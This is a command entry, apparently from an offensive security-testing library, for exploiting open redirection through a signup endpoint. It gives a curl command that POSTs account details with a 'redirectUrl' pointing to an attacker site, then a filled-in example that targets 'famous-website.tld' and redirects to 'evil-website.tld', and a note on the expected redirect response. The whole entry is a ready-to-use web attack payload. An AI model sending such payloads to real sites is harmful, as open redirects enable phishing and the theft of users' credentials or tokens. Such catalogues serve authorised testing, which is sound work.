---
id: 7d7f0bf4-7185-40c0-be98-8971982cccb2
name: fill-in-signup-form
type: command
executor: bash
data: >-
  curl -X POST "$_TARGET_URL/signup" -d '{"username":"$_USERNAME",
  "password":"$_PASSWORD", "email":"$_EMAIL", "redirectUrl":"$_MALICIOUS_URL"}'
  -H "Content-Type: application/json" -v
output: null
created_at: '2023-04-06T03:56:31.693130+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - exploit
  - web
verified: true
validated: true
---

# fill-in-signup-form

## Command

```bash
curl -X POST "$_TARGET_URL/signup" -d '{"username":"$_USERNAME", "password":"$_PASSWORD", "email":"$_EMAIL", "redirectUrl":"$_MALICIOUS_URL"}' -H "Content-Type: application/json" -v
```

## Description

Fills and submits a signup form with a malicious redirect URL embedded in the payload to exploit open redirection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Signup endpoint | Yes |
| $_USERNAME | Desired username | Yes |
| $_PASSWORD | Password | Yes |
| $_EMAIL | Email address | Yes |
| $_MALICIOUS_URL | Redirect to attacker site | Yes |
| -H | Set JSON content type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://famous-website.tld/signup" -d '{"username":"test", "password":"test123", "email":"test@example.com", "redirectUrl":"https://evil-website.tld"}' -H "Content-Type: application/json" -v
```

## Expected Output

HTTP/1.1 201 Created or 302 redirect to malicious URL.

## Related

- [[procedures/Open-URL-Redirection-Exploitation]]
- [[commands/add-redirect-url]]
